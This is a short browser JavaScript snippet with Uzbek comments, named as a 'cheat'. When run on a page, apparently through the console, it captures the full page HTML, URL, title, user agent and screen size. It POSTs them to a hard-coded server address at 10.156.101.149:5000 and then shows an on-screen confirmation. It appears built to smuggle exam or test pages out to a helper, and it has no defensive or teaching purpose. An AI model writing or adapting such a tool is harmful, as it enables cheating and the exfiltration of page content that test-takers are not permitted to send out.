(async function cheatSendToMyServer() {
    try {
        // BU YERDA O'Z SERVER MANZILINGIZNI YOZING (o'zgartirish mumkin)
        const SERVER_URL = "http://10.156.101.149:5000/";  // ← Bu yerda o'zgartiring!

        console.log("=== Cheat boshlandi ===");
        console.log("Server manzili:", SERVER_URL);

        const payload = {
            html: document.documentElement.outerHTML,
            url: window.location.href,
            title: document.title,
            client_id: 7,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            screenSize: `${window.screen.width}x${window.screen.height}`
        };

        console.log("Yuborilayotgan hajm:", JSON.stringify(payload).length, "bayt");

        const response = await fetch(SERVER_URL, {
            method: "POST",
            mode: "cors",
            cache: "no-cache",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Server xatosi: ${response.status} → ${errorText}`);
        }

        const result = await response.json();
        console.log("Muvaffaqiyatli yuborildi!", result);

        // Chiroyli bildirishnoma
        const msg = document.createElement("div");
        msg.innerHTML = `Sahifa yuborildi!<br>Server: ${SERVER_URL.split('/api')[0]}<br>ID: ${payload.client_id}`;
        msg.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #2ecc71;
            color: white;
            padding: 20px 30px;
            border-radius: 10px;
            z-index: 9999999;
            font-family: Arial;
            box-shadow: 0 5px 20px rgba(0,0,0,0.4);
            font-size: 18px;
            text-align: center;
        `;
        document.body.appendChild(msg);
        setTimeout(() => msg.remove(), 8000);

    } catch (error) {
        console.error("=== CHEAT XATOSI ===", error);

        const errMsg = document.createElement("div");
        errMsg.innerHTML = "Xato: " + error.message + "<br>Server manzilini tekshiring!";
        errMsg.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #c0392b;
            color: white;
            padding: 20px 30px;
            border-radius: 10px;
            z-index: 9999999;
            font-family: Arial;
        `;
        document.body.appendChild(errMsg);
        setTimeout(() => errMsg.remove(), 10000);
    }
})();
